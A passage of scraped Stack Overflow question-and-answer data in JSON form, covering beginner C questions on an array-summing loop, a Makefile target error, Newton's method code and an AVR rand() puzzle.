"https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/35904205#35904205", "title": "Getting a for loop to work with negative numbers", "body": "<p>You should only iterate through your array <code>SCORES_SIZE-1</code> times. Inside the loop simply add current + next and store it into your array, as such:</p>\n\n<pre><code>include&lt;stdio.h&gt;\n\nint main(void)\n{\n    const int SCORES_SIZE = 4;\n    int bonusScores[SCORES_SIZE];\n    int i = 0;\n\n    bonusScores[0] = 10;\n    bonusScores[1] = 20;\n    bonusScores[2] = 30;\n    bonusScores[3] = 40;\n\n    /* Your solution goes here  */\n    for (i = 0; i &lt; SCORES_SIZE-1; i++)\n    {\n\n        bonusScores[i] = (bonusScores [i] + bonusScores[i+1]);\n    }\n    for (i = 0; i &lt; SCORES_SIZE; ++i)\n    {\n        printf(\"%d \", bonusScores[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457564539, "post_id": 35904209, "comment_id": 59469183, "body": "Thank you for your help. I&#39;m really unsure why I had some of those random things in there. Thank you again. Your explanations did a great job explaining where I went wrong."}, {"owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "reply_to_user": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "edited": false, "score": 0, "creation_date": 1457564612, "post_id": 35904209, "comment_id": 59469213, "body": "@pckofwolfs No at all. We beginners should help each other.:)"}], "tags": [], "owner": {"reputation": 219634, "user_id": 2877241, "user_type": "registered", "accept_rate": 52, "profile_image": "https://www.gravatar.com/avatar/63d17ecdadc8917254be4fb70e86246b?s=128&d=identicon&r=PG&f=1", "display_name": "Vlad from Moscow", "link": "https://stackoverflow.com/users/2877241/vlad-from-moscow"}, "is_accepted": true, "score": 1, "last_activity_date": 1457564183, "last_edit_date": 1457564183, "creation_date": 1457563557, "answer_id": 35904209, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/35904209#35904209", "title": "Getting a for loop to work with negative numbers", "body": "<p>In the assignment there is written</p>\n\n<blockquote>\n  <p>Be careful not to index beyond the last element</p>\n</blockquote>\n\n<p>However this loop</p>\n\n<pre><code>   for (i = 0; i &lt; SCORES_SIZE; i++)\n   {\n        if (( bonusScores[i] &lt;= bonusScores[i +1] ) || (bonusScores[i] &lt; bonusScores [i+1]))\n        {\n            bonusScores[i] = (bonusScores [i] + bonusScores[i+1]);\n        }\n        else\n        {\n            bonusScores[i] = bonusScores[i];\n        }\n    }\n</code></pre>\n\n<p>tries to use an index beyond the last element when <code>i</code> is equal to <code>SCORES_SIZE - 1</code></p>\n\n<p>And there is nothing said in the assignment about this condition</p>\n\n<pre><code>if (( bonusScores[i] &lt;= bonusScores[i +1] ) || (bonusScores[i] &lt; bonusScores [i+1]))\n</code></pre>\n\n<p>which is the same as</p>\n\n<pre><code>if (( bonusScores[i] &lt;= bonusScores[i +1] ))\n</code></pre>\n\n<p>It is not clear why you wrote this condition.</p>\n\n<p>The loop can look the following way</p>\n\n<pre><code>for ( i = 1; i &lt; SCORES_SIZE; ++i )\n{\n    bonusScores[i-1] += bonusScores[i];\n}\n</code></pre>\n\n<p>Here is a demonstrative program</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main( void ) \n{\n    const int SCORES_SIZE = 4;\n    int bonusScores[SCORES_SIZE];\n\n    bonusScores[0] = 10;\n    bonusScores[1] = 20;\n    bonusScores[2] = 30;\n    bonusScores[3] = 40;\n\n    for ( int i = 1; i &lt; SCORES_SIZE; ++i )\n    {\n        bonusScores[i-1] += bonusScores[i];\n    }\n\n    for ( int i = 0; i &lt; SCORES_SIZE; ++i )\n    {\n        printf( \"%d \", bonusScores[i] );\n    }\n    printf( \"\\n\" );\n\n    bonusScores[0] = -100;\n    bonusScores[1] = -200;\n    bonusScores[2] = -300;\n    bonusScores[3] = -400;\n\n    for ( int i = 1; i &lt; SCORES_SIZE; ++i )\n    {\n        bonusScores[i-1] += bonusScores[i];\n    }\n\n    for ( int i = 0; i &lt; SCORES_SIZE; ++i )\n    {\n        printf( \"%d \", bonusScores[i] );\n    }\n    printf( \"\\n\" );\n}    \n</code></pre>\n\n<p>Its output is</p>\n\n<pre><code>30 50 70 40 \n-300 -500 -700 -400 \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1686, "user_id": 2971820, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/uq4Hh.jpg?s=128&g=1", "display_name": "jpmottin", "link": "https://stackoverflow.com/users/2971820/jpmottin"}, "is_accepted": false, "score": 0, "last_activity_date": 1457563858, "creation_date": 1457563858, "answer_id": 35904288, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/35904288#35904288", "title": "Getting a for loop to work with negative numbers", "body": "<p>Perhaps, this is what are you expecting:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n\nint main(void) {\n    const int SCORES_SIZE = 4;\n    int bonusScores[SCORES_SIZE];\n    int i = 0;\n\n    bonusScores[0] = -10;\n    bonusScores[1] = -20;\n    bonusScores[2] = -30;\n    bonusScores[3] = -40;\n\n    printf(\"Negative scores:\\n\");\n    for (i = 0; i &lt; SCORES_SIZE; i++)\n    {\n        if(i!=SCORES_SIZE-1)\n            bonusScores[i] = (bonusScores [i] + bonusScores[i+1]);\n    }\n    for (i = 0; i &lt; SCORES_SIZE; ++i) {\n      printf(\"%d \", bonusScores[i]);\n    }\n    printf(\"\\n\");\n\n    bonusScores[0] = 10;\n    bonusScores[1] = 20;\n    bonusScores[2] = 30;\n    bonusScores[3] = 40;\n\n    printf(\"Positive scores:\\n\");\n    for (i = 0; i &lt; SCORES_SIZE; i++)\n    {\n        if(i!=SCORES_SIZE-1)\n            bonusScores[i] = (bonusScores [i] + bonusScores[i+1]);\n    }\n    for (i = 0; i &lt; SCORES_SIZE; ++i) {\n      printf(\"%d \", bonusScores[i]);\n    }\n\n    return 0;\n}\n</code></pre>\n\n<p>Voici la sortie console :</p>\n\n<pre><code>Negative scores:\n-30 -50 -70 -40 \nPositive scores:\n30 50 70 40 \n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 7589978, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/200f85fc9f37ba2ee156d303c8e93b2c?s=128&d=identicon&r=PG&f=1", "display_name": "RocketMan0896", "link": "https://stackoverflow.com/users/7589978/rocketman0896"}, "is_accepted": false, "score": 0, "last_activity_date": 1489379458, "creation_date": 1489379458, "answer_id": 42756662, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/42756662#42756662", "title": "Getting a for loop to work with negative numbers", "body": "<pre><code>//This is the Java version of your problem, if anyone is interested.\npublic class StudentScores {\n  public static void main (String [] args) {\n  final int SCORES_SIZE = 4;\n  int[] bonusScores = new int[SCORES_SIZE];\n  int i = 0;\n\n  bonusScores[0] = 10;\n  bonusScores[1] = 20;\n  bonusScores[2] = 30;\n  bonusScores[3] = 40;\n\nfor (i = 0; i &lt; SCORES_SIZE - 1; ++i) {\n    bonusScores[i] = (bonusScores[i] + bonusScores[i+1]);\n    }\n\nfor (i = 0; i &lt; SCORES_SIZE; ++i) {\n     System.out.print(bonusScores[i] + \" \");\n    }\n     System.out.println();\n\n  return;\n    }\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 1, "user_id": 10452159, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-wF_krz9eOCA/AAAAAAAAAAI/AAAAAAAAA_4/ffWMHhBTojI/photo.jpg?sz=128", "display_name": "CarverOfChoice", "link": "https://stackoverflow.com/users/10452159/carverofchoice"}, "is_accepted": false, "score": 0, "last_activity_date": 1538580736, "creation_date": 1538580736, "answer_id": 52630706, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/52630706#52630706", "title": "Getting a for loop to work with negative numbers", "body": "<p>Simple loop:</p>\n\n<pre><code>/* Your solution goes here  */\n  for (i = 0; i &lt; bonusScores.length; ++i) \n  {\n     if (i == bonusScores.length -1)\n     {\n        break;\n     }\n     bonusScores[i] = (bonusScores[i] + bonusScores[i+1]);\n  }\n\n\n  for (i = 0; i &lt; bonusScores.length; ++i) \n  {\n     System.out.print(bonusScores[i] + \" \");\n  }\n  System.out.println();\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 3854, "user_id": 10607772, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e478f2600848a3dc5238b7ffb2e148f6?s=128&d=identicon&r=PG", "display_name": "double-beep", "link": "https://stackoverflow.com/users/10607772/double-beep"}, "edited": false, "score": 2, "creation_date": 1553877419, "post_id": 55421395, "comment_id": 97562915, "body": "Welcome to Stack Overflow! While this code may solve the question, <a href=\"//meta.stackexchange.com/q/114762\">including an explanation</a> of how and why this solves the problem would really help to improve the quality of your post, and probably result in more up-votes. Remember that you are answering the question for readers in the future, not just the person asking now. Please <a href=\"https://stackoverflow.com/posts/55421395/edit\">edit</a> your answer to add explanations and give an indication of what limitations and assumptions apply."}], "tags": [], "owner": {"reputation": 1, "user_id": 11278436, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-ZnyZsYPhpy8/AAAAAAAAAAI/AAAAAAAAAAA/ACHi3rdEOORe_buux77xPRI0E9IzyGfDeA/mo/photo.jpg?sz=128", "display_name": "Mike Galicia", "link": "https://stackoverflow.com/users/11278436/mike-galicia"}, "is_accepted": false, "score": 0, "last_activity_date": 1553875630, "creation_date": 1553875630, "answer_id": 55421395, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers/55421395#55421395", "title": "Getting a for loop to work with negative numbers", "body": "<pre><code>for(i = 0; i &lt; bonusScores.length - 1; i++)\n{\nbonusScores[i] += bonusScores[i + 1];\n}\n</code></pre>\n"}], "owner": {"reputation": 75, "user_id": 5548063, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/239423254faf60a09d2de160087e0333?s=128&d=identicon&r=PG&f=1", "display_name": "pckofwolfs", "link": "https://stackoverflow.com/users/5548063/pckofwolfs"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 16610, "favorite_count": 2, "accepted_answer_id": 35904209, "answer_count": 8, "score": 2, "last_activity_date": 1553875630, "creation_date": 1457561804, "last_edit_date": 1457564740, "question_id": 35903783, "link": "https://stackoverflow.com/questions/35903783/getting-a-for-loop-to-work-with-negative-numbers", "title": "Getting a for loop to work with negative numbers", "body": "<p>Write a loop that sets each array element to the sum of itself and the next element, except for the last element which stays the same. Be careful not to index beyond the last element. Ex:\nInitial scores:        10, 20, 30, 40\nScores after the loop: 30, 50, 70, 40\nThe first element is 30 or 10 + 20, the second element is 50 or 20 + 30, and the third element is 70 or 30 + 40. The last element remains the same. \n<strong><em>This is a homework question that I need help with.</em></strong>\nWhat I am having problems with is if the bonusScores are negative the example it uses against my code is -100, -200, -300 , -400, -500.</p>\n\n<pre><code>include&lt;stdio.h&gt;\n\nint main(void)\n{\n    const int SCORES_SIZE = 4;\n    int bonusScores[SCORES_SIZE];\n    int i = 0;\n\n    bonusScores[0] = 10;\n    bonusScores[1] = 20;\n    bonusScores[2] = 30;\n    bonusScores[3] = 40;\n\n    /* Your solution goes here  */\n    for (i = 0; i &lt; SCORES_SIZE; i++)\n    {\n        if (( bonusScores[i] &lt;= bonusScores[i +1] ) || (bonusScores[i] &lt; bonusScores [i+1]))\n        {\n            bonusScores[i] = (bonusScores [i] + bonusScores[i+1]);\n        }\n        else\n        {\n            bonusScores[i] = bonusScores[i];\n        }\n    }\n    for (i = 0; i &lt; SCORES_SIZE; ++i)\n    {\n        printf(\"%d \", bonusScores[i]);\n    }\n    printf(\"\\n\");\n\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "makefile"], "answers": [{"comments": [{"owner": {"reputation": 16382, "user_id": 5507349, "user_type": "registered", "accept_rate": 88, "profile_image": "https://i.stack.imgur.com/IaCUb.jpg?s=128&g=1", "display_name": "Edgar Rokj\u0101n", "link": "https://stackoverflow.com/users/5507349/edgar-rokj%c4%81n"}, "edited": false, "score": 0, "creation_date": 1457560664, "post_id": 35903318, "comment_id": 59467261, "body": "Also it&#39;s better to mark <code>clean</code> as a <code>PHONY</code> target."}], "tags": [], "owner": {"reputation": 45534, "user_id": 106104, "user_type": "registered", "accept_rate": 62, "profile_image": "https://www.gravatar.com/avatar/c88b9310b92a937108ec4336c2832f92?s=128&d=identicon&r=PG", "display_name": "user253751", "link": "https://stackoverflow.com/users/106104/user253751"}, "is_accepted": true, "score": 0, "last_activity_date": 1457560134, "creation_date": 1457560134, "answer_id": 35903318, "question_id": 35903293, "link": "https://stackoverflow.com/questions/35903293/makefile-error-no-rule-to-make-target-c/35903318#35903318", "title": "Makefile error - *** No rule to make target , C", "body": "<p><code>make</code> looks for the makefile with the name <code>Makefile</code>.</p>\n\n<p>You can use the <code>-f</code> option to tell it to look somewhere else, like so:</p>\n\n<pre><code>make -f ex2.mak clean\n</code></pre>\n\n<p>or you can rename the makefile to <code>Makefile</code>.</p>\n"}, {"tags": [], "owner": {"reputation": 4888, "user_id": 5785362, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/2a786fd81952576dc07942023bf8830b?s=128&d=identicon&r=PG", "display_name": "tofro", "link": "https://stackoverflow.com/users/5785362/tofro"}, "is_accepted": false, "score": 0, "last_activity_date": 1457563658, "creation_date": 1457563658, "answer_id": 35904232, "question_id": 35903293, "link": "https://stackoverflow.com/questions/35903293/makefile-error-no-rule-to-make-target-c/35904232#35904232", "title": "Makefile error - *** No rule to make target , C", "body": "<p>Most beginners' problems with makefiles is: The command (in your case the line containing \"rm...\" does not begin with a <em>real tab character</em>. If it doesn't, the makefile will not be correctly interpreted.</p>\n\n<p>If you write a makefile, make sure your editor does not convert tabs to spaces and also make sure that <em>you</em> don't type spaces instead of tab characters. Other than that, the makefile looks O.K. to me so far.</p>\n"}], "owner": {"reputation": 49, "user_id": 4351783, "user_type": "registered", "accept_rate": 83, "profile_image": "https://www.gravatar.com/avatar/0951268ff57805223cd6d8db2fcdceb2?s=128&d=identicon&r=PG&f=1", "display_name": "Faisal148991", "link": "https://stackoverflow.com/users/4351783/faisal148991"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 816, "favorite_count": 0, "accepted_answer_id": 35903318, "answer_count": 2, "score": 0, "last_activity_date": 1457563658, "creation_date": 1457560060, "question_id": 35903293, "link": "https://stackoverflow.com/questions/35903293/makefile-error-no-rule-to-make-target-c", "title": "Makefile error - *** No rule to make target , C", "body": "<p>I am learning C and I am trying to call a rule that I have had to write in a makefile:</p>\n\n<pre><code>CFlAGS=-Wall -g\n\nclean:\n    rm -f ex1\n</code></pre>\n\n<p>However when I enter the command <code>$make clean</code> I get the error:</p>\n\n<p><code>make: *** No rule to make target 'clean'.  Stop.</code>\nI am using Cygwin64 terminal on windows and I have stored the makefile under the name ex2.mak however it is still not working</p>\n"}, {"tags": ["c", "newtons-method"], "comments": [{"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 1, "creation_date": 1457560725, "post_id": 35903155, "comment_id": 59467287, "body": "Show how you call it."}, {"owner": {"reputation": 2971, "user_id": 4975646, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XzXhmdjjKB0/AAAAAAAAAAI/AAAAAAAAAeg/9rsygRfbVyk/photo.jpg?sz=128", "display_name": "callyalater", "link": "https://stackoverflow.com/users/4975646/callyalater"}, "edited": false, "score": 1, "creation_date": 1457561311, "post_id": 35903155, "comment_id": 59467627, "body": "What are the values you are putting in for <code>a</code>, <code>b</code>, and <code>eps</code>?"}, {"owner": {"reputation": 2971, "user_id": 4975646, "user_type": "registered", "profile_image": "https://lh5.googleusercontent.com/-XzXhmdjjKB0/AAAAAAAAAAI/AAAAAAAAAeg/9rsygRfbVyk/photo.jpg?sz=128", "display_name": "callyalater", "link": "https://stackoverflow.com/users/4975646/callyalater"}, "edited": false, "score": 0, "creation_date": 1457562653, "post_id": 35903155, "comment_id": 59468308, "body": "Could you also post your actual function that is being passed in. <code>cos(x)-w*t</code> seems to take 3 parameters, but only two are provided. Is <code>t</code> supposed to be <code>x</code>? If your function uses <code>t</code> but it is set to 0, then you will always get the same answer. If <code>t</code> and <code>w</code> are constants, then the root will always be a shifted offset of just <code>cos(x)</code>. There are so many unknowns in your code that it is hard to know where to begin. If you could include a complete, compilable example, that would help determine the problem."}], "owner": {"reputation": 1, "user_id": 6041839, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/fc99d0b0a7aafcd406a98c07fff94735?s=128&d=identicon&r=PG&f=1", "display_name": "Loozman Cool", "link": "https://stackoverflow.com/users/6041839/loozman-cool"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 85, "favorite_count": 1, "answer_count": 0, "score": 0, "last_activity_date": 1457559768, "creation_date": 1457559562, "last_edit_date": 1457559768, "question_id": 35903155, "link": "https://stackoverflow.com/questions/35903155/newtons-method-in-c-error-always-the-same-root", "title": "Newton&#39;s method in C error - always the same root", "body": "<p>This is my code:</p>\n\n<pre><code>void Newton(double a,double b,double eps, double (*func)(double,double))\n{\n    double root;\n    double x,y;\n    x=a; y=b; root=y-func(y,0.5)/((func(y,0.5)-func(x,0.5))/(y-x));\n    double i;\n    int n=(15-0.5)*10+1;\n    for(i=0;i&lt;n;i++)\n    {\n        while(fabs(y-x)&gt;eps)\n        {\n            x=y;\n            y=root;\n            root=y-func(y,((double)i/10+0.6))/((func(y,((double)i/10+0.6))-func(x,((double)i/10+0.6)))/(y-x));\n        }\n        printf(\"The root computed by the Newton's method for w=%lf is %lf\\n\",((double)i/10+0.5),root);\n    }\n}\n</code></pre>\n\n<p>It is only the function computing and printing roots calculated by the Newton's method of some arbitrary equation which is stated in the function 'func'. The result printed is always the same. It should differ as long as the factors in the equation change. My function is <code>cos(x)-w*t</code>, where <code>w</code> are numbers <code>{0.5,0.6,...,15.0}</code>.\n<code>a</code> and <code>b</code> are my initial arguments for searching the root, eps is some arbitrarily small number which is the accuracy here.</p>\n"}, {"tags": ["c", "arduino", "avr"], "comments": [{"owner": {"reputation": 20558, "user_id": 2864275, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/p2xKk.png?s=128&g=1", "display_name": "I\u0142ya Bursov", "link": "https://stackoverflow.com/users/2864275/i%c5%82ya-bursov"}, "edited": false, "score": 2, "creation_date": 1457559493, "post_id": 35903049, "comment_id": 59466642, "body": "so, basically you want to say that <code>(rand()%52)*6</code> is always 0?"}, {"owner": {"reputation": 40219, "user_id": 898348, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/13b3f2c44ba8449bd60764d07f4538dc?s=128&d=identicon&r=PG", "display_name": "Jabberwocky", "link": "https://stackoverflow.com/users/898348/jabberwocky"}, "edited": false, "score": 2, "creation_date": 1457559644, "post_id": 35903049, "comment_id": 59466739, "body": "How are the <code>t#</code> variables declared ?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 2, "creation_date": 1457559756, "post_id": 35903049, "comment_id": 59466800, "body": "Can you show the full code, please? Also provide all of the values involved."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 3, "creation_date": 1457560283, "post_id": 35903049, "comment_id": 59467059, "body": "Did you call <code>srand</code>? It may be that, in your implementation, the unseeded <code>rand</code> produces a number divisible by <code>52</code>. What does <code>rand</code> return?"}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1457562255, "post_id": 35903049, "comment_id": 59468118, "body": "Voting to close if no requested information is provided."}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457563859, "post_id": 35903049, "comment_id": 59468884, "body": "yes ((rand()%52)*6 is always zero"}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1457564786, "post_id": 35903049, "comment_id": 59469270, "body": "@Stepperz69 Then tell us what rand() returns"}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "reply_to_user": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1457566321, "post_id": 35903049, "comment_id": 59469861, "body": "@nos for example running it a few times is giving me random values 0x2CD9, 0x0C2A, 0x3782, etc."}], "answers": [{"comments": [{"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457566699, "post_id": 35904506, "comment_id": 59470014, "body": "Thanks for the advice, as you can see from my comment above, the values returned by rand() are perfectly fine. The modulo is also producing good values. It&#39;s only when I multiply it where it becomes zero. That is it always becomes zero, no matter the result of th modulo."}, {"owner": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "reply_to_user": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457567130, "post_id": 35904506, "comment_id": 59470167, "body": "I don&#39;t know what complier you are using, but I would start looking into any known (1) compiler issues,  (2) different optimization levels, and (3) looking at the assembler that is created -- and use whatever debugger you have available to single step through the code."}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457567433, "post_id": 35904506, "comment_id": 59470275, "body": "Yeah, I think the compiler may be doing something stupid here... :/ I&#39;ll look into it."}, {"owner": {"reputation": 206047, "user_id": 126769, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/zBsgn.png?s=128&g=1", "display_name": "nos", "link": "https://stackoverflow.com/users/126769/nos"}, "edited": false, "score": 0, "creation_date": 1457569071, "post_id": 35904506, "comment_id": 59470849, "body": "Make sure sizeof int is what you think it is, at least witth gcc, there&#39;s compiler options to make an int 8 bits on AVR processors albeit you should also look closely at (all) the code for any buffer overflows, you could move the declaration of px around to try to see if any buffer overflows affet it."}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457569818, "post_id": 35904506, "comment_id": 59471126, "body": "Look at the addresses 19A and 1BC, game_thread() seems to be in two places... What also looks odd is that 21C seems to rely on 1BC for the value in r15. Is this sort of odd setup normal? <a href=\"https://drive.google.com/open?id=1JCelPzi7Z6Vd8mO5Qxr--TmQEpcEsM98wNxVBXvjA9I\" rel=\"nofollow noreferrer\">drive.google.com/&hellip;</a>"}], "tags": [], "owner": {"reputation": 13595, "user_id": 668501, "user_type": "registered", "accept_rate": 100, "profile_image": "https://www.gravatar.com/avatar/3f15b157200c05100d6baeb0ede510f0?s=128&d=identicon&r=PG", "display_name": "Soren", "link": "https://stackoverflow.com/users/668501/soren"}, "is_accepted": false, "score": 2, "last_activity_date": 1457565002, "creation_date": 1457565002, "answer_id": 35904506, "question_id": 35903049, "link": "https://stackoverflow.com/questions/35903049/c-why-is-my-px-variable-zero/35904506#35904506", "title": "C, Why is my &#39;px&#39; variable zero?", "body": "<p>Your initial value of <code>rand()</code> is probably divisable by 52 (as suggested by Lashane).  First of all try to make sure you call <code>srand()</code> if you are using -- BUT do make sure you are calling it exactly and only ONCE.  For simple applications you can use the <code>time()</code> value for seeding into <code>srand</code>, however for more secure applications you should find something to seed with that cannot easily be guessed.</p>\n\n<p>You always have the risk of the value be divisable by 52, so if zero is an undesirable values use</p>\n\n<pre><code>px = (r%51)+1;\n</code></pre>\n\n<p>to make sure that the values returned are between 1 and 51</p>\n"}, {"comments": [{"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457570794, "post_id": 35905512, "comment_id": 59471411, "body": "Bearing in mind that I wrote the scheduler and I disable interrupts when i access the variables. I don&#39;t think that&#39;s the issue."}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457571331, "post_id": 35905512, "comment_id": 59471577, "body": "And no, commenting lcd_display_char_xy(&#39;.&#39;, px, py); doesn&#39;t work... :("}, {"owner": {"reputation": 1437, "user_id": 4685116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cdca5.jpg?s=128&g=1", "display_name": "Ing. Gerardo S&#225;nchez", "link": "https://stackoverflow.com/users/4685116/ing-gerardo-s%c3%a1nchez"}, "reply_to_user": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457615726, "post_id": 35905512, "comment_id": 59493433, "body": "and int pxg y int pxr test?"}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457703835, "post_id": 35905512, "comment_id": 59539658, "body": "There are no write collisions. Interrupts are disabled so a task switch cannot happen."}, {"owner": {"reputation": 23, "user_id": 3001372, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99afe1b701be841c3a6ba92b4dcc194f?s=128&d=identicon&r=PG", "display_name": "Stepperz96", "link": "https://stackoverflow.com/users/3001372/stepperz96"}, "edited": false, "score": 0, "creation_date": 1457703917, "post_id": 35905512, "comment_id": 59539732, "body": "This is on a single core 8-bit microcontroller btw :P"}], "tags": [], "owner": {"reputation": 1437, "user_id": 4685116, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/cdca5.jpg?s=128&g=1", "display_name": "Ing. Gerardo S&#225;nchez", "link": 